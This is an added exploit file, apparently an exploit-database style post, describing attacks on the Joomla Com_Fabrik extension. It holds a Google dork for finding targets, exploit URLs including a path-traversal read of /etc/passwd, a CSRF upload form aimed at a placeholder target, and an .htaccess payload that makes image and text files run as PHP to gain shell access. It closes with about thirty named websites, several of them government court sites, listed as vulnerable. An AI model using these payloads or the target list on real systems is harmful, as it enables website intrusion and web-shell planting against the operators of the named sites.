@@ -1,0 +1,246 @@
+#################################################################################################
+
+# Exploit Title : Joomla Com_Fabrik 3.9 pluginAjax importcsv
+_advancedsearch getprodimg controller LFI with htaccess CSRF Shell Access
+Vulnerability
+# Author [ Discovered By ] : KingSkrupellos from Cyberizm Digital Security
+Army
+# Date : 29/11/2018
+# Vendor Homepage : extensions.joomla.org/extension/fabrik/ ~ fabrikar.com
+# Tested On : Windows and Linux
+# Software Download Links : fabrikar.com/downloads
+# Category : WebApps
+# Version Information : All Current Versions and 3.9
+# Google Dorks : inurl:''/index.php?option=com_fabrik''
+# Exploit Risk : Medium
+# Vulnerability Type : CWE-264 - [ Permissions, Privileges, and Access
+Controls ]
++ CWE-434 - [ Unrestricted Upload of File with Dangerous Type PHP ]
+
+#################################################################################################
+
+# Exploit Title : Joomla Com_Fabrik pluginAjax importcsv _advancedsearch
+getprodimg controller LFI with htaccess CSRF Shell Access Vulnerability
+
+# Admin Panel Login Path :
+
+/administrator/
+
+#################################################################################################
+
+# Exploit 1 :
+
+/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload
+
+# Error :
+
+{"filepath":null,"uri":null}
+
+{"error":"Error. Unable to upload file."}
+
+#################################################################################################
+
+# Exploit 2 :
+
+/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1
+
+/index.php?option=com_fabrik&c=import&view=import&fietype=csv&tableid=0
+
+Directory File Path : /media/...
+
+#################################################################################################
+
+# Exploit 3 :
+
+/index.php?option=com_fabrik&format=partial&view=list&layout=_advancedsearch&tmpl=component&listid=11
+
+/index.php?option=com_fabrik&format=partial&view=list&layout=_advancedsearch&tmpl=component&listid=
+12&nextview=list&scope=com_fabrik&tkn=[RANDOM-HASH-NUMBERS]
+
+Add and Delete Vulnerability
+
+Note : If websites says while exploiting the code like this '' Sorry this
+form is not published ''. It is not vulnerable. Bugs Fixed.
+
+#################################################################################################
+
+# Exploit 4 :
+
+/component/fabrik/form/8/index.php?option=com_fabrik&format=raw&controller=plugin&c=plugin&task=userAjax&method=getprodimg
+
+# Example Error :
+
+{"id":8,"model":"table","errors":[],"data":{"___betrieb":[""],"___modell":"","___betreff":"Probefahrt","___firma":"","
+___anrede":["0"],"___name":"","___email":"",
+"___strasse":"","___plz":"","___ort":"","___telefon":"","___bemerkungen":"","___empfaenger":"","___captcha":"","
+___datenschutz":[""]},"html":{"___betrieb":"\r\n","___modell":"","___betreff":"<!--
+Probefahrt -->","___firma":"",
+"___anrede":"bitte
+wA$?hlen","___name":"","___email":"","___strasse":"","___plz":"","___ort":"","___telefon":"",
+"___bemerkungen":"","___empfaenger":"<!--
+-->","___captcha":"","___datenschutz":""},"post":
+{"option":"com_fabrik","format":"raw","controller":"plugin","c":"plugin","task":"userAjax","method":
+"getprodimg\\","Itemid":null,"view":"form","formid":"8","rowid":"index"}}
+
+#################################################################################################
+
+# Exploit 5 :
+
+/index.php?option=com_fabrik&controller=[Local File Inclusion]
+
+/index.php?option=com_fabrik&controller=../../../../../../../../../../etc/passwd%00
+
+Note : If says while exploiting the code '' 0  Call to a member function
+getData() on null ''.  It means that the vulnerability has been fixed.
+
+#################################################################################################
+
+# CSRF Exploiter Code =>  [ Upload Htaccess File via This Script ] - Save
+this file as [yourfilename].html
+
+<title>KingSkrupellos - Cyberizm Digital Security Team</title>
+<br>
+<br>
+<font size="10">Joomla CSRF Com_Fabrik File Upload Shell Access
+Exploiter</h1><br><br>
+<form method="POST"
+action="http://www.[TARGETSITE]/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload"
+enctype="multipart/form-data">
+<input type="file" name="file"><button>OKAY</button>
+</form>
+</center><br></font>
+
+#################################################################################################
+
+# HtAccess File =>
+
+DirectoryIndex cyberizm.html
+AddType application/x-httpd-php .png
+AddType application/x-httpd-php .gif
+AddType application/x-httpd-php .jpg
+AddType application/x-httpd-php .txt
+AddType application/x-httpd-php .fla
+AddType application/x-httpd-php .php
+AddType application/x-httpd-php .asp
+AddType application/x-httpd-php .js
+AddType application/x-httpd-php .shtml
+AddType application/x-httpd-php .html
+AddType application/x-httpd-php .htm
+
+# or you can use this
+
+DirectoryIndex index.html
+AddType application/x-httpd-php .png
+AddType application/x-httpd-php .txt
+AddType application/x-httpd-php .fla
+
+#################################################################################################
+
+# Exploit 1 => Example Successfull Attack Scenario =>
+
+{"filepath":"\/.htaccess","uri":"http:\/\/pn-kebumen.go.id\/.htaccess"}
+
+# Shell Access Path : TARGETDOMAIN/media/[YOURSHELLNAMEHERE.php]
+
+#################################################################################################
+
+# Example Vulnerable Sites =>
+
+[+]
+pn-kebumen.go.id/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload
+
+[+]
+pn-jeneponto.go.id/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload
+
+[+]
+pn-sidikalang.go.id/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload
+
+[+]
+pn-parepare.go.id/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload
+
+[+]
+pn-balige.go.id/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload
+
+[+]
+ticketexchange.co.il/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload
+
+[+]
+tiwc.gr/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload
+
+[+]
+labelchip.it/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload
+
+[+]
+halaimemon.org/index.php?option=com_fabrik&format=partial&view=list&layout=_advancedsearch&tmpl=component&listid=11
+
+[+]
+dakotahistory.org/index.php?option=com_fabrik&format=partial&view=list&layout=_advancedsearch&tmpl=
+component&listid=12&nextview=list&scope=com_fabrik&tkn=
+
+[+]
+volkswagen-automobile-berlin.de/component/fabrik/form/8/index.php?option=com_fabrik&format=raw&controller=
+plugin&c=plugin&task=userAjax&method=getprodimg
+
+[+]
+cyo-no.org/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload
+
+[+]
+tchoukball.org/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload
+
+[+]
+lluisoshorta.org/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload
+
+[+]
+bluejaylodgecostarica.com/index.php?option=com_fabrik&c=import&view=import&fietype=csv&tableid=0
+
+[+]
+aswc.seagrant.uaf.edu/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload
+
+[+]
+wildwood.edu/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload
+
+[+]
+bnetrust.org/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload
+
+[+]
+seadfoundation.org/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload
+
+[+]
+edim.org/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload&lang=fr
+
+[+]
+tpacharterschool.org/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload
+
+[+]
+delamoflyers.org/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload
+
+[+]
+mairie-orsay.fr/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload
+
+[+]
+cfh-aih.fr/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload
+
+[+]
+industriesalon.de/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload
+
+[+]
+ostbayern-kurier.de/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload
+
+[+]
+wanzenschreck.de/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload
+
+[+]
+traditionalscouting.co.uk/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload
+
+[+]
+kabin.no/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload
+
+[+]
+bcsd.us/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload
+
+#################################################################################################
+
+# Discovered By KingSkrupellos from Cyberizm.Org Digital Security Team
+
+#################################################################################################
+
